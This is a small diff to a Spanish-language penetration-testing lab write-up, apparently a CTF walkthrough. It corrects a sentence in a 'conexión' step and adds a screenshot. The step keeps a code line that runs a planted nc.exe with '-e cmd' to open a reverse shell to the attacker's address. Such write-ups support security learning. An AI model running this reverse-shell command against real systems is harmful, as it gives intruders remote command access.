@@ -346,7 +346,9 @@ vemos las peticiones en nuestro servidor lo que nos indica que se acaba de desca
 ![[Pasted image 20240520173318.png]]
 
 ### conexión
-ahora usaremos un nuevo comando para ejecutar el nc.exe y establecer una conexion con nuestra ma
+ahora usaremos un nuevo comando para ejecutar el nc.exe y establecer una conexión con nuestra maquina
 ```python
 system("C:\\Windows\\System32\\spool\\drivers\\color\\nc.exe -e cmd 10.10.14.30");
 ```
+![[Pasted image 20240520173557.png]]
+
